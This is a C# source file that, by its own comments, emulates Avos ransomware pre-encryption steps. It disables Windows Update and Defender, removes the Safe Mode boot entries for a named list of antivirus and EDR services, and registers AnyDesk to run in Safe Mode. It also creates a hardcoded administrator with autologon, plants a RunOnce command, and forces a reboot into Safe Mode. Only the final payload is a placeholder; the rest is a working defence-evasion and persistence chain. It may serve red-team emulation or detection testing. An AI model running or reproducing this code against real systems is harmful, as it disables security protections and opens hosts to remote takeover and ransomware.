/*
 * Requires being run in a high integrity process
*/

using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace UnsafeMode 
{
    class UnsafeMode
    {
        static void RegEdit(string operation, string RegPath, string RegName, string RegValue, int valueKind) {
            Microsoft.Win32.RegistryKey key;
            switch (operation) {
                case "add":
                    Console.WriteLine("[!] Writing the {0} Reg Value", RegName);
                    key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, true);
                    if (valueKind == 1)
                    {
                        key.SetValue(RegName, RegValue, RegistryValueKind.DWord);
                    }
                    else
                    {
                        key.SetValue(RegName, RegValue);
                    }
                    key.Close();
                    break;
                case "del":
                    Console.WriteLine("[!] Deleting the {0} Reg Value", RegName);
                    key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, true);
                    try
                    {
                        key.DeleteValue(RegName);
                    }
                    catch (System.ArgumentException e) {
						//assuming Arg Except is due to already missing the key
                        Console.WriteLine("[+] {0} doesn't exist", RegName);
                    }
                    key.Close();
                    break;
                case "addKey":
                    Console.WriteLine("[!] Creating the {0} Reg Key", RegName);
                    key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(RegPath + @"\" + RegName, true);
                    key.Close();
                    break;
                default:
                    Console.WriteLine("default");
                    break;
            }
        }
        static void RunCommand(string Command) {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.FileName = @"CMD.EXE";
            p.StartInfo.Arguments = @"/C " + Command;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();
            Console.WriteLine("[+] Ran command: {0}", Command);
            Console.WriteLine(output);
            Console.WriteLine(error);
        }
        static void Main(string[] args) {
			//CHANGE THESE
			//Avos typically uses a DC hosted payload for encryption
            string runOnce = @"cmd.exe /c mkdir C:\Temp & echo POC > C:\Temp\poc.txt";
            string userName = "newadmin";
            string password = "Password123456";

            Console.WriteLine("Unsafe Mode\n============================");
            RunCommand("net stop wuauserv");
            RunCommand("sc config wuauserv start= disabled");
            RegEdit("add", @"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1", 1);
            //trying to disable typical AV/EDR when running in safe mode
            string[] delete = {"SepMasterService", "CbDefense", "CbDefenseWSC", "EPProtectedService", "epredline", "CylanceSvc", "SAVService", "klnagent", "Sophos File Scanner Service", "SntpService", "EPSecurityService", "EPUpdateService", "EPIntegrationService", "TmCCSF", "TmWSCSvc"};
		    foreach(string protection in delete)
		    {
				RegEdit("del", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", protection, "", 0);
		    }
            //adding anydesk to run in safemode (Avos abuses anydesk)
            RegEdit("addKey", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", "AnyDeskMSI", "", 0);
            RegEdit("add", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDeskMSI", "", "Service", 0); //writes to the (default) reg value
            RegEdit("addKey", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", "AnyDesk", "", 0);
            RegEdit("add", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDesk", "", "Service", 0);
            //setting up auto logon & runonce reg
            RegEdit("del", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultDomainName", "", 0);
            RegEdit("add", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultUserName", userName, 0);
            RegEdit("add", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultPassword", password, 0);
            RegEdit("add", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "AutoAdminLogon", "1", 0);
            RegEdit("add", @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "*a", runOnce + " & bcdedit /deletevalue {default} safeboot", 0); //not adding the restart after bcdedit which is typical for Avos
            //setting up new admin user
            RunCommand("net user " + userName + " " + password + " /add");
            RunCommand("net localgroup Administrators " + userName + " /add");
            //deleting legal notices to make autologon smoother
            RegEdit("del", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeCaption", "", 0);
            RegEdit("del", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeText", "", 0);
            RegEdit("del", @"SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "LegalNoticeCaption", "", 0);
            RegEdit("del", @"SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "LegalNoticeText", "", 0);
            //restarting to safe mode
            RunCommand("bcdedit /set {default} safeboot network");
            RunCommand("bcdedit /set {current} bootstatuspolicy ignoreallfailures");
            RunCommand("shutdown -r -t 0");
        }
    }     
}